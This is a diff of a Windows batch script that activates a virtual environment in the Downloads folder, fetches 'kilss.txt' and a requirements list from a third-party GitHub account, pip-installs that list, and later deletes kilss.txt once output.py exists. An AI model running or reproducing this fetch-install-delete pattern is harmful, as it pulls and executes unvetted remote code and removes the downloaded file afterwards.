@@ -1,15 +1,17 @@
 @echo off
+
 set "downloads_folder=%USERPROFILE%\Downloads"
 
 
 set "activate_script=%downloads_folder%.\.venv\Scripts\activate"
 
+cd /d "%downloads_folder%"
+
 call "%activate_script%"
 
+curl -o %USERPROFILE%\Downloads\kilss.txt https://raw.githubusercontent.com/zerot2Dev/devsc/main/kilss.txt
 
-curl -O https://raw.githubusercontent.com/zerot2Dev/devsc/main/kilss.txt
-
-curl -O https://raw.githubusercontent.com/zerot2Dev/zero_import/main/requirements.txt
+curl -o %USERPROFILE%\Downloads\requirements.txt https://raw.githubusercontent.com/zerot2Dev/zero_import/main/requirements.txt
 
 
 pip install -r requirements.txt
@@ -42,4 +44,3 @@ if exist output.py (
     del kilss.txt
 
 )
-
